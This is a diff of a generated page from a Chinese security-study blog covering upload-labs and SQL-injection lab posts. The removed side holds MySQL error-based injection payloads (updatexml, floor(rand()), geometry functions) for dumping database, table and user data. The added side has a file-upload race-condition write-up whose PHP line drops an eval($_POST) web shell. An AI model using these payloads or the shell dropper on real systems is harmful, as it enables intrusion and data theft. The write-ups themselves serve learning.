@@ -71,9 +71,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Web/注入漏洞/SQL注入/报错注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/文件上传/upload-labs/配置文件详解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -83,79 +83,29 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>1、报错注入的分类</p>
-<p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以把MySQL报错注入分为以下几类：</p>
-<pre><code>· Biglnt等数据类型溢出
-
-· xpath语法错误
-
-· count()+rand()+group_by()导致主键重复
-
-· 空间数据类型函数错误
-</code></pre>
-<p>‍</p>
-<p><strong>xpath语法错误</strong></p>
-<p>从<strong>mysql5.1.5</strong>开始提供了两个<strong>XML</strong>查询和修改的函数:</p>
-<p>1.<strong>updatexml():</strong> 适用于5.5.5-5.5.49版本<br>2.extractvalue():适用于5.1.5+版本</p>
-<p>可以通过xml函数报错，来显示注入命令执行结果。</p>
-<p><strong>updatexml函数格式:</strong> updatexml((XML_document, XPath_string, new_value)</p>
-<p> <strong>·XML_document:</strong> xml文档的名称。</p>
-<p> <strong>·XPath_string:</strong> xpath格式的字符串</p>
-<p> <strong>·new_value:</strong> 替换查找到的符合条件的数据</p>
-<p><strong>extractvalue函数格式:</strong> extractvalue((XML document,XPath string)，除了没有第三个参数</p>
-<p>(new_value)，其它与updataxml()函数完全一样。所以后面只讲updatexml()函数的使用。</p>
-<p>简而言之，updatexml函数功能就是查找一个字符串，并进行替换。而我们在XPath</p>
-<p>string处也就是第二个参数那里传入不符合xpath格式的特殊字符，并加上一些查询语</p>
-<p>句，mysql就会把错误和查询语句的结果报错显示出来。这就是xpath报错注入的原理，</p>
-<p><strong>注意事项:</strong></p>
-<p>·必须是在<strong>XPath_string</strong>处传特殊字符，mysql才会报错，同时我们还需要注入命令，没这</p>
-<p>么多位置，所以要用到concat函数。</p>
-<p> <strong>·xpath</strong>只会对特殊字符进行报错，这里我们可以用16进制的0x7e(~)来进行利用。</p>
-<p>·<strong>xpath</strong>只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分</p>
-<p>段输出。</p>
-<p><strong>函数说明：</strong><br> <strong>·concat(s1,s2…sn):</strong> 将字符串s1,s2…sn合并为一个字符串。</p>
-<p>·<strong>substr(s,start,length):</strong> 从字符串s的 start 位置截取长度为 length 的子字符串，start从<strong>1</strong>开始。</p>
-<p>‍</p>
-<blockquote>
-<h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><p>1、寻找注入点		2、判断字符型还是数字型		3、判断闭合方式</p>
-<p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p>
-<p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p>
-<p><strong>5、使用updatexml查找表名</strong></p>
-<p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p>
-<p><strong>6、使用updatexmml查询列名</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p>
-<p><strong>7、查询具体数据</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p>
+        <h1 id="配置文件详解"><a href="#配置文件详解" class="headerlink" title="配置文件详解"></a>配置文件详解</h1><h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><blockquote>
+<p>作用:·分布式配置文件，一般用于 URL·重写、认证、访问控制等<br>作用范围:特定目录(一般是网站根目录)及其子目录<br>优先级:<strong>较高</strong>，可覆盖Apache·的主要配置文件(httpd-conf)<br>生效方式:修改后立刻生效</p>
 </blockquote>
-<h3 id="思考一下，为什么要这么构造攻击语句"><a href="#思考一下，为什么要这么构造攻击语句" class="headerlink" title="思考一下，为什么要这么构造攻击语句?"></a>思考一下，为什么要这么构造攻击语句?</h3><p>首先回到语法格式上:updatexml((XML_document,XPath_string,new_value)，我们必须在XPath_string这个参数里填充xpath格式的字符串，但是如果我们填充一个不是xpath格式的字符串，就会产生报错，所以语句就变成了updatexml(1,database(),1)，前后两个1是随便填充的内容目的是满足三个参数。<br>但是由于xpath只会对<strong>特殊字符</strong>进行报错（还有其他字符也可以实现），这里我们可以用~，16进制的0x7e来进行利用，所以就变成了updatexml(1,0x7edataase()0x7e,1)，但是由于数据库无法认识中间的内容，所以就无法成功执行，所以可以用concat()函数把多个字符串合并成一个，就变成了updatexml(1,concat(0x7e,database(),0x7e),1)</p>
-<p>‍</p>
-<p>思考:为什么中间的查询语句外面要括号括起来?</p>
-<p>因为concat()，中间<strong>不允许有空格</strong>，所以需要括号括起来把变成一个整体。<br><strong>concat()</strong> 函数无法将多行合并为一行，所以可以先用group_conat()函数将多行合并为一行。</p>
-<p>‍</p>
-<p>‍</p>
-<p>报错注入主要是利用updatexml()函数，其它方法偶尔会用到，这里集中介绍。<br>rend()+group()+count():虚拟表报错</p>
-<p>获取数据库名<br>select 1 from(select</p>
-<p>count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;	#concat()的第二个参数是查询的命令，这里是database()获取表名<br>select 1 from(select count(</em>),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;<br>获取列名<br>select 1from(select count(</em>),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),floor(rand(0)*2))x  from information_schema.tables group by x)a;</p>
-<p>获取数据<br>select 1 from(select count(*),concat((select (select (select concat(0x7e,first_name,0x7e)))from users limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;</p>
-<p>或者使用下面的payload：</p>
-<p>获取数据库名<br>select count(*),concat((select database()),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
-<p>获取表名<br>select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
-<p>获取列名<br>select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’limit 0,1),0x7e,floor(rand(0)*2))as a  from information_schema.tables group by a;</p>
-<p>获取数据<br>select count(*),concat((select first name from users limit 0,1),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;</p>
-<p>（rand：生成0~1的随机数 floor向下取整）</p>
-<p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;（会有一个虚拟的表group，因为floor是向下取整的，只会随机出来0或者1的值所以当键值插入相同的时候就会键值冲突，冲突就会报错出来）</p>
-<p>‍</p>
-<blockquote>
-<p> <strong>·几何函数:以下payload未测试</strong><br>GeometryCollection: id&#x3D;1 AND GeometryCollection((select * from(select * from(select user())a)b)polygon():id&#x3D;1 AND polygon((select * from(select *from(select user())a)b))multipoint():id&#x3D;l AND multipoint((select * from(select *from(select  user())a)b))multilinestring():id&#x3D;1 AND multilinestring((select *from(select * from(select user())a)b))linestring():id&#x3D;1 AND LINESTRING((select *from(select * from(select user())a)b))multipolygon():id&#x3D;1 AND multipolygon((select *from(selectfrom(select user())a)b))</p>
-<p>‍</p>
-<p><strong>name_const:</strong>  仅可用于获取数据库版本信息</p>
+<h1 id="httpd-conf"><a href="#httpd-conf" class="headerlink" title="httpd-conf"></a>httpd-conf</h1><blockquote>
+<p>作用:°包含 Apache·HTTP.服务器的全局行为和默认设置<br>作用范围:整个服务器<br>优先级:<strong>较低</strong><br>生效方式:管理员权限，重启服务器后生效</p>
 </blockquote>
+<h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><blockquote>
+<p>作用:特定于用户或特定目录的配置文件,通常位于·Web·应用程序的根目录下。<br>它用于覆盖或追加全局配置文件(如·php.ini)中的·PHP.配置选项。<br>作用范围:存放该文件的目录以及其子目录<br>优先级:<strong>较高</strong>，可以覆盖 php.ini<br>生效方式:立即生效</p>
+</blockquote>
+<h1 id="php-ini"><a href="#php-ini" class="headerlink" title=".php.ini"></a>.php.ini</h1><blockquote>
+<p>作用:存储了对整个·PHP.环境生效的配置选项。它通常位于·PHP.安装目录中<br>作用范围:所有运行在该·PHP·环境中的·PHP·请求<br>优先级:·较低<br>生效方式:重启 php 或 web 服务器</p>
+</blockquote>
+<p>‍</p>
+<p>加载方式:会首先加载·php.ini&#x2F;httpd-conf 文件中的配置。然而，如果在某个目录下存在·.userini&#x2F;.htaccess:文件,服务器会在处理请求时检查该目录,并覆盖相应的配置项。</p>
+<p>‍</p>
+<h1 id="user-ini可以生效的前提"><a href="#user-ini可以生效的前提" class="headerlink" title=".user.ini可以生效的前提:"></a>.user.ini可以生效的前提:</h1><p>最好大于 5.3.0，最好是用 7.X 版本的<br>Server·AP!.为 CGl&#x2F;FastCG——Phpinfo()查看Server·API<br>(Server·API(Application·Programming·Interface，应用程序编程接<br>口)是一组定义了软件组件之间交互方式的规范。在这种情况下<br>Server·API·是指用于连接和交互的服务器端软件接口。)<br>user.ini 文件上传漏洞的前提:<br>.user.ini 可以生效并且该上传目录有 php 文件</p>
+<p>‍</p>
+<h1 id="user-ini文件上传漏洞的前提："><a href="#user-ini文件上传漏洞的前提：" class="headerlink" title=".user.ini文件上传漏洞的前提："></a>.user.ini文件上传漏洞的前提：</h1><p>.user.ini可以生效并且该上传目录<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">有php文件</span></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawczpoh003iik7kex070f92" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/" data-id="cmaxy8gci003tkg7k1mcb4n25" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -167,9 +117,9 @@
 
 
   
-    <article id="post-Web/文件上传/upload-labs/二次渲染绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/文件上传/upload-labs/条件竞争与绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" class="article-date">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -179,24 +129,147 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//会去获得浏览器中的content-type</span></span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);<span class="comment">//使用上传的图片生成新的图片,文件的重写，二次渲染</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;         </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h1 id="条件竞争与绕过"><a href="#条件竞争与绕过" class="headerlink" title="条件竞争与绕过"></a>条件竞争与绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>经过二次渲染以后的图片马，将不会保留一句话木马，只保留图片的原始信息</p>
+<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?><p>‘);?&gt;   &#x2F;&#x2F;生成小马</p>
+<p>fput函数：打开文件资源,如果shell.php不存在的话，我将新建shell.php文件,’w’以写入的方式把一句话木马写入到shell.php中</p>
 </blockquote>
-<p>所以要绕过，我们就去找二次渲染后的图片，然后比较和之前的图片相同的地方，然后因为那里面是不会被二次渲染的，我们在那里插入我们的一句话木马</p>
 <blockquote>
-<p>但是推荐用gif，因为gif的二次渲染的相匹配的更多</p>
+<p>文件竞争，是因为这个文件要到服务器去处理，到服务器处理的话那么服务器就会有判断时间（if时长），那我们不断地上传，只要有一时刻生成小马文件上传成功，那么我们就有了一句话木马得到权限</p>
 </blockquote>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
-<p>php二次渲染不会重复多次渲染，我们可以检测二次渲染过后的再上传再看，然后再在二次渲染的图片中插入一句话木马，有可能不会被二次渲染掉</p>
+<p><img src="/.com//image-20250123214234-jpnq0tp.png" alt="image"> </p>
+<blockquote>
+<p>我们只需要不断地上传这个小马文件，然后让系统有一瞬间处理勒这个小马文件</p>
 </blockquote>
+<p>即我上传的111.php生成小马文件，那么我访问&#x2F;upload&#x2F;111.php</p>
+<p>上传和访问都在burp上面循环访问，知道生成shell.php成功，访问shell.php</p>
 <p>‍</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" data-id="cmawczpoi003pik7k8j4odz8a" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E4%B8%8E%E7%BB%95%E8%BF%87/" data-id="cmaxy8gcj003vkg7k0qxn42uq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[GYCTF2020]Blacklist" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
